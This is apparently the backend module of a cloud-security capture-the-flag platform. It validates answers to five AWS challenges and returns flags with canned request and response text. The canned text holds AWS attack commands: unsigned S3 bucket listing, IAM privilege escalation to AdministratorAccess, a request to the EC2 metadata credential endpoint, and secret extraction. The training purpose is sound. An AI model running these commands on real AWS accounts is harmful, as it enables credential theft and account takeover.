const { getFlag } = require("../../utils/flags");
const { validateAWS } = require("../../utils/validators");

function submitAWS(level, payload) {
  const id = Number(level);
  const isCorrect = validateAWS(id, payload);

  const requests = {
    1: `aws s3 ls s3://VulnXploit-company-data --no-sign-request

GET / HTTP/1.1
Host: VulnXploit-company-data.s3.amazonaws.com`,
    2: `aws iam create-access-key --user-name admin-user
aws iam attach-user-policy --user-name lowpriv --policy-arn arn:aws:iam::aws:policy/AdministratorAccess`,
    3: `GET http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254`,
    4: `aws ec2 describe-security-groups --group-ids sg-0a1b2c3d4e5f`,
    5: `aws secretsmanager get-secret-value --secret-id prod/database
aws lambda invoke --function-name data-processor`,
  };

  const successResponses = {
    1: `200 OK

credentials.csv
database-backup.sql
employee-data.csv
secrets/
flag.txt`,
    2: `{
  "AccessKey": {
    "UserName": "admin-user",
    "AccessKeyId": "AKIAIOSFODNN7EXAMPLE",
    "Status": "Active",
    "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
  }
}

Privilege escalation successful → AdministratorAccess attached.`,
    3: `HTTP/1.1 200 OK

ami-id
hostname
iam/security-credentials/
instance-id
local-ipv4

# /iam/security-credentials/EC2-Role
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "IQoJb3JpZ2luX2VjE...",
  "Expiration": "2026-08-24T12:00:00Z"
}`,
    4: `Security Group: sg-0a1b2c3d4e5f (web-server-sg)

Inbound Rules:
  TCP  22     0.0.0.0/0     ← SSH open to the world
  TCP  3306   0.0.0.0/0     ← MySQL open to the world
  TCP  80     0.0.0.0/0

Risk: Critical – Instance fully exposed.`,
    5: `{
  "ARN": "arn:aws:secretsmanager:us-east-1:123456789012:secret:prod/database",
  "Name": "prod/database",
  "SecretString": "{\\"username\\":\\"admin\\",\\"password\\":\\"Pr0d_S3cr3t_2026!\\",\\"host\\":\\"db.internal.VulnXploit.local\\"}",
  "VersionId": "..."
}

Secrets successfully extracted using Lambda execution role.`,
  };

  const failResponses = {
    1: "403 Forbidden\nAccessDenied",
    2: "An error occurred (AccessDenied): User is not authorized",
    3: "404 Not Found",
    4: "No critical findings with current input.",
    5: "AccessDeniedException: User is not authorized to perform: secretsmanager:GetSecretValue",
  };

  if (!isCorrect) {
    return {
      success: false,
      message: "Payload did not solve the challenge.",
      request: requests[id] || `Input: ${payload}`,
      response: failResponses[id] || "Access denied",
    };
  }

  return {
    success: true,
    message: "Challenge solved successfully!",
    flag: getFlag("cloud", "aws", id),
    request: requests[id] || `Input: ${payload}`,
    response: successResponses[id] || "Vulnerability successfully exploited",
  };
}

module.exports = { submitAWS };